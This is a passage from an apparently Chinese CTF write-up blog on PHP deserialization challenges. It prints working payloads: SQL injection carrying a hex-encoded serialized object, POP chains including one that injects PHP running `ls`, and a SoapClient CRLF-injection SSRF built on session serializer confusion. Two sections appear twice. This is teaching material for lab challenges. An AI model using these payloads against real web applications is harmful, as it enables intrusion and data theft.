class="string">&quot;) VALUES(&quot;</span>.(<span class="title function_ invoke__">implode</span>(<span class="string">&quot;,&quot;</span>,<span class="variable">$sql_val</span>)).<span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">mysqli_insert_id</span>(<span class="variable">$con</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>经过上面的代码审计可知，只对文件的后缀名作了处理，所以我们传参时能利用文件名即title</p><p>并且其将文件名保存到数据库中，就可能存在sql注入。</p><p><code>$sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;</code></p><p>→<code>INSERT INTO images(title,filename,ext,path,attr) VALUES(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);</code></p></blockquote></li><li><p>反序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM images&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$this</span>-&gt;con, <span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>())&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&quot;attr&quot;</span>])&#123;</span><br><span class="line">    <span class="variable">$attr_temp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0\0\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$row</span>[<span class="string">&quot;attr&quot;</span>]);</span><br><span class="line"><span class="variable">$attr</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$attr_temp</span>);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;id=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>].<span class="string">&quot; filename=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;filename&quot;</span>].<span class="string">&quot; path=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$this</span>-&gt;con);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>只将attr进行反序列化</p><p>所以我们可以构造title使得attr为我们构造的序列化内容。</p><p><code>title=1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,payload)#</code></p><p><code>INSERT INTO images(title,filename,ext,path,attr) VALUES(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);</code></p><p>→<code>INSERT INTO images(title,filename,ext,path,attr) VALUES(&#39; 1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,payload)#&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;)</code></p></blockquote></li><li><p>利用</p><p>help类</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;ifview == False)&#123;</span><br><span class="line"><span class="keyword">return</span> False;</span><br><span class="line"><span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>谁调用了view_files</p><p>help类</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment"># Read some config html</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">view_files</span>(<span class="variable">$this</span>-&gt;config);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>综上利用的属性</p><p>help-&gt;ifview &#x3D; True</p><p>help-&gt;config &#x3D; flag路径</p></blockquote><p>pop链</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$ifview</span> = True; </span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$config</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">helper</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;</span><br><span class="line">O:<span class="number">6</span>:<span class="string">&quot;helper&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;*ifview&quot;</span>;b:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">&quot;*config&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;/flag&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;helper&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;\0\0\0ifview&quot;</span>;b:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">&quot;\0\0\0config&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;/flag&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>反序列化前<code>$attr_temp = str_replace(&#39;\0\0\0&#39;, chr(0).&#39;*&#39;.chr(0), $row[&quot;attr&quot;]);</code></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#转换为16进制 不能有引号</span></span><br><span class="line"><span class="number">0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</span></span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d)#`</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220807140140896-1687419234886.png" alt="image-20220807140140896"></p><p><img src="/../images/image-20220807140151143-1687419234886.png" alt="image-20220807140151143"></p></li></ol><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><h3 id="1-发现构造函数和反序列化函数知道考察序列化"><a href="#1-发现构造函数和反序列化函数知道考察序列化" class="headerlink" title="1.发现构造函数和反序列化函数知道考察序列化"></a>1.发现构造函数和反序列化函数知道考察序列化</h3><h3 id="2-代码审计得到大致流程"><a href="#2-代码审计得到大致流程" class="headerlink" title="2.代码审计得到大致流程"></a>2.代码审计得到大致流程</h3><p>传参str→is_valid()函数过滤→unserialize()函数触发destruct()函数：判断op→调用process()函数，op为2时→调用read()函数</p><h3 id="3-payload"><a href="#3-payload" class="headerlink" title="3.payload"></a>3.payload</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot; 2&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br><span class="line"></span><br><span class="line">不修改属性，使用大S</span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;S:<span class="number">5</span>:<span class="string">&quot;\00*\00op&quot;</span>;i:<span class="number">2</span>;S:<span class="number">11</span>:<span class="string">&quot;\00*\00filename&quot;</span>;S:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;S:<span class="number">10</span>:<span class="string">&quot;\00*\00content&quot;</span>;S:<span class="number">7</span>:<span class="string">&quot;N;&#125;</span></span><br></pre></td></tr></table></figure><h4 id="（1）op的值"><a href="#（1）op的值" class="headerlink" title="（1）op的值"></a>（1）op的值</h4><p>可以为’   2’和2来使destruct()中的不成立</p><p><img src="https://khaz.top/typora/images/image-20220403152704038.png" alt="image-20220403152704038"></p><p>绕过process()的</p><p><img src="https://khaz.top/typora/images/image-20220403152748861.png" alt="image-20220403152748861"></p><h4 id="（2）成员改为public-x2F-使用大S"><a href="#（2）成员改为public-x2F-使用大S" class="headerlink" title="（2）成员改为public&#x2F;使用大S"></a>（2）成员改为public&#x2F;使用大S</h4><p><img src="https://khaz.top/typora/images/image-20220403152827512.png" alt="image-20220403152827512"></p><p>1.只允许可打印字符，而原先是protected类型，序列化以后会有不可打印字符%00</p><p>而查询得知在 PHP7.2+的环境中，使用 public 修饰成员并序列化，反序列化后成员也会被 public 覆盖修饰。</p><p>2.protected属性序列化会引入\00<em>\00。但是\00是不可打印字符，所以我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。即手动将\00</em>\00变为\x00*\x00</p><h2 id="2022DASCTF-X-SU-三月春季挑战赛ezpop"><a href="#2022DASCTF-X-SU-三月春季挑战赛ezpop" class="headerlink" title="2022DASCTF X SU 三月春季挑战赛ezpop"></a>2022DASCTF X SU 三月春季挑战赛ezpop</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fin::<span class="title function_ invoke__">__destrcut</span>()→what::<span class="title function_ invoke__">__tostring</span>()→mix::<span class="title function_ invoke__">__run</span>()→crow::<span class="title function_ invoke__">__invoke</span>()→fin::<span class="title function_ invoke__">__call</span>()→mix::<span class="title function_ invoke__">__get_flag</span>()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$fin</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$crow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">crow</span>();</span><br><span class="line"><span class="variable">$what</span> = <span class="keyword">new</span> <span class="title function_ invoke__">what</span>();</span><br><span class="line"><span class="variable">$mix</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$mix2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"><span class="variable">$fin2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#重复用到了fin-&gt;f1和min-&gt;m1，所以有$mix2 = new mix();$fin2 = new fin();</span></span><br><span class="line"><span class="variable">$fin</span>-&gt;f1 = <span class="variable">$what</span>;</span><br><span class="line"><span class="variable">$what</span>-&gt;a = <span class="variable">$mix</span>;</span><br><span class="line"><span class="variable">$mix</span>-&gt;m1 = <span class="variable">$crow</span>;</span><br><span class="line"><span class="variable">$crow</span>-&gt;v1 = <span class="variable">$fin2</span>;</span><br><span class="line"><span class="variable">$fin2</span>-&gt;f1 = <span class="variable">$mix2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$mix2</span>-&gt;m1 = <span class="string">&quot;?&gt;&lt;?php echo `ls`;?&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$fin</span>);</span><br></pre></td></tr></table></figure><h2 id="网鼎杯-2020-青龙组-AreUSerialz-1"><a href="#网鼎杯-2020-青龙组-AreUSerialz-1" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><h3 id="1-发现构造函数和反序列化函数知道考察序列化-1"><a href="#1-发现构造函数和反序列化函数知道考察序列化-1" class="headerlink" title="1.发现构造函数和反序列化函数知道考察序列化"></a>1.发现构造函数和反序列化函数知道考察序列化</h3><h3 id="2-代码审计得到大致流程-1"><a href="#2-代码审计得到大致流程-1" class="headerlink" title="2.代码审计得到大致流程"></a>2.代码审计得到大致流程</h3><p>传参str→is_valid()函数过滤→unserialize()函数触发destruct()函数：判断op→调用process()函数，op为2时→调用read()函数</p><h3 id="3-payload-1"><a href="#3-payload-1" class="headerlink" title="3.payload"></a>3.payload</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot; 2&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br><span class="line"></span><br><span class="line">不修改属性，使用大S</span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;S:<span class="number">5</span>:<span class="string">&quot;\00*\00op&quot;</span>;i:<span class="number">2</span>;S:<span class="number">11</span>:<span class="string">&quot;\00*\00filename&quot;</span>;S:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;S:<span class="number">10</span>:<span class="string">&quot;\00*\00content&quot;</span>;S:<span class="number">7</span>:<span class="string">&quot;N;&#125;</span></span><br></pre></td></tr></table></figure><h4 id="（1）op的值-1"><a href="#（1）op的值-1" class="headerlink" title="（1）op的值"></a>（1）op的值</h4><p>可以为’   2’和2来使destruct()中的不成立</p><p><img src="https://khaz.top/typora/images/image-20220403152704038.png" alt="image-20220403152704038"></p><p>绕过process()的</p><p><img src="https://khaz.top/typora/images/image-20220403152748861.png" alt="image-20220403152748861"></p><h4 id="（2）成员改为public-x2F-使用大S-1"><a href="#（2）成员改为public-x2F-使用大S-1" class="headerlink" title="（2）成员改为public&#x2F;使用大S"></a>（2）成员改为public&#x2F;使用大S</h4><p><img src="https://khaz.top/typora/images/image-20220403152827512.png" alt="image-20220403152827512"></p><p>1.只允许可打印字符，而原先是protected类型，序列化以后会有不可打印字符%00</p><p>而查询得知在 PHP7.2+的环境中，使用 public 修饰成员并序列化，反序列化后成员也会被 public 覆盖修饰。</p><p>2.protected属性序列化会引入\00<em>\00。但是\00是不可打印字符，所以我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。即手动将\00</em>\00变为\x00*\x00</p><h2 id="2022DASCTF-X-SU-三月春季挑战赛ezpop-1"><a href="#2022DASCTF-X-SU-三月春季挑战赛ezpop-1" class="headerlink" title="2022DASCTF X SU 三月春季挑战赛ezpop"></a>2022DASCTF X SU 三月春季挑战赛ezpop</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fin::<span class="title function_ invoke__">__destrcut</span>()→what::<span class="title function_ invoke__">__tostring</span>()→mix::<span class="title function_ invoke__">__run</span>()→crow::<span class="title function_ invoke__">__invoke</span>()→fin::<span class="title function_ invoke__">__call</span>()→mix::<span class="title function_ invoke__">__get_flag</span>()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$fin</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$crow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">crow</span>();</span><br><span class="line"><span class="variable">$what</span> = <span class="keyword">new</span> <span class="title function_ invoke__">what</span>();</span><br><span class="line"><span class="variable">$mix</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$mix2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"><span class="variable">$fin2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#重复用到了fin-&gt;f1和min-&gt;m1，所以有$mix2 = new mix();$fin2 = new fin();</span></span><br><span class="line"><span class="variable">$fin</span>-&gt;f1 = <span class="variable">$what</span>;</span><br><span class="line"><span class="variable">$what</span>-&gt;a = <span class="variable">$mix</span>;</span><br><span class="line"><span class="variable">$mix</span>-&gt;m1 = <span class="variable">$crow</span>;</span><br><span class="line"><span class="variable">$crow</span>-&gt;v1 = <span class="variable">$fin2</span>;</span><br><span class="line"><span class="variable">$fin2</span>-&gt;f1 = <span class="variable">$mix2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$mix2</span>-&gt;m1 = <span class="string">&quot;?&gt;&lt;?php echo `ls`;?&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$fin</span>);</span><br></pre></td></tr></table></figure><h4 id="buu–bestphp‘s-revenge"><a href="#buu–bestphp‘s-revenge" class="headerlink" title="buu–bestphp‘s revenge"></a>buu–bestphp‘s revenge</h4><p>flag.php（目录扫描得到）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">only localhost can get flag!</span><br><span class="line"><span class="title function_ invoke__">session_start</span>(); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;only localhost can get flag!&#x27;</span>; </span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)</span><br><span class="line">&#123; <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>] = <span class="variable">$flag</span>; &#125; </span><br><span class="line">only localhost can get flag! </span><br></pre></td></tr></table></figure><blockquote><p>本地请求访问flag.php时，会将flag写入session中</p><p>利用php原生类SoapClient可以构造ssrf，需要触发SoapClient::call。</p></blockquote><p>SoapClient：</p><p><a href="https://www.anquanke.com/post/id/153065#h2-1">https://www.anquanke.com/post/id/153065#h2-1</a></p><p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html</a></p><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>], <span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$b</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>上面提到了要触发SoapClient::call。那么哪里可以实例化SoapClient对象呢？</p><blockquote><p>答案是在session中实例化。<a href="https://xz.aliyun.com/t/6640#toc-5">https://xz.aliyun.com/t/6640#toc-5</a></p></blockquote><p><img src="/../images/20191026142328-1fba974c-f7b9-1-1687419234886.png" alt="img"></p><p>$_SESSION环境变量和服务器上的seission文件</p><blockquote><p>$_SESSION环境变量：保存实例化对象</p><p>在会话结束后将数据序列化保存到seission文件中。</p><p>会话开始后，会根据cookie中的phpsession_id将session文件（如果有）的内容反序列化保存到$_SESSION环境变量中。</p></blockquote><p>序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">  <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;khaz^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br></pre></td></tr></table></figure><p>第一次，更改php的session引擎，通过序列化和反序列化时引擎的不同使下一次请求时session中保存的是我们构造的SoapClient对象。</p><p><img src="/../images/image-20220730203810430-1687419234886.png" alt="image-20220730203810430"></p><blockquote><p>POST ：serialize_handler&#x3D;php_serialize</p><p>GET    :   f&#x3D;session_start</p><p><code>call_user_func($_GET[&#39;f&#39;], $_POST);</code>将session引擎设置为php_serialize（在下一次中生效）</p></blockquote><p>注：使用session_start设置引擎，而不是用ini_set来设置，因为session_start能够处理数组，而ini_set不行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>(<span class="title function_ invoke__">arrary</span>(<span class="string">&#x27;serialize_handler&#x27;</span>=&gt;<span class="string">&#x27;php_serialize&#x27;</span>))</span><br></pre></td></tr></table></figure><blockquote><p>GET:   name&#x3D; |+序列化内容（记得在前面加上|）</p><p>$_SESSION[‘name’] &#x3D; $_GET[‘name’];</p><p>这时候session文件中保存的数据就是上图response中的。</p></blockquote><p>第二次，还是上一次的cookie，通过覆盖变量触发SoapClient::call方法</p><p><img src="/../images/image-20220730204831558-1687419234886.png" alt="image-20220730204831558"></p><blockquote><p>与上一次相同的cookie，服务器就会根据cookie找到我们构造的session文件，并将其内容反序列化保存到$_SESSION中，此时因为引擎的不同，反序列化后得到的就是构造好的SoapClient对象。</p></blockquote><p>触发SoapClient::call方法</p><blockquote><p>POST ：b&#x3D;call_user_func</p><p>GET    :   f&#x3D;extract</p><p><code>call_user_func($_GET[&#39;f&#39;], $_POST);</code>即<code>extract($_POST)</code>→b&#x3D;call_user_func</p><p><code>$a = array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);</code></p><p><code>call_user_func($b, $a);</code>即</p><p><code>call_user_func(call_user_func, 